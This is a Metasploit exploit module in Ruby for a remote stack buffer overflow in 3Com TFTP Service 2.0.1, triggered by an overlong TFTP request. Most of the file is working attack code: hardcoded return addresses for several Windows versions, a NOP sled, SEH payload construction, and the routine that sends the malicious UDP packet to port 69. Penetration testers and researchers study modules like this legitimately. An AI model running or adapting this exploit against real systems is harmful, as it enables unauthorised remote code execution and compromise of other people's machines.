require 'msf/core'

module Msf

class Exploits::Windows::Tftp::ThreeCeeTftpSvc_Overflow < Msf::Exploit::Remote

	include Exploit::Remote::Udp
	include Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => '3CTftpSvc Server 2.0.1 Long Requesat Buffer Overflow',
			'Description'    => %q{
				3Com TFTP Service version 2.0.1 suffers from a long type buffer
				overflow during TFTP requests.

				Liu Qixu of NCNIPC published this vulnerability.
			},
			'Author'         => 'grutz [at] jingojango.net',
			'Version'        => '$$',
			'References'     => 
				[ 
					['URL', 'http://support.3com.com/software/utilities_for_windows_32_bit.htm'],
					['BID', '21301'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 440,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			
			'Targets'        =>
				[
					['Windows 2000 All SP English',   { 'Ret' => 0x750217ae } ], # call esi ws2help
					['Windows 2003 SP0/SP1 English',  { 'Ret' => 0x71bf1c40 } ], # CALL ESI ws2help
					['Windows 2003 SP1 ebx esi ret',  { 'Ret' => 0x76f58361 } ], # esi ebx ret 
   					['Windows 2003 SP1 ecx ecx ret',  { 'Ret' => 0x77bb287a } ], #
					['Windows XP SP2 English',        { 'Ret' => 0x71aa1b22 } ], # call esi ws2help
				],

			'DefaultTarget'  => 0,
			'Privileged'     => true,
			'DisclosureDate' => 'Nov 27 2006'

			))

			register_options(
				[
						Opt::RPORT(69)
				], self)

	end

	def exploit
		connect_udp

		print_status("Trying target #{target.name}...")

		sploit = 
			"\x00\x02" + 
			Rex::Text.rand_text_english(1, payload_badchars) + 
			"\x00" +
			make_nops(473) +
			[target.ret].pack('V') +
			"\x00"
			
		if (target.name =~ /2003/)
			seh = generate_seh_payload(target.ret)
			sploit[9, seh.length] = seh
		else
		        sploit[9, payload.encoded.length] = payload.encoded
		end

		#print_status("Payload length = #{payload.encoded.length}")
		#print_status("Sploit length  = #{sploit.length}")


		udp_sock.put(sploit)
		
		disconnect_udp		
	end

end
end
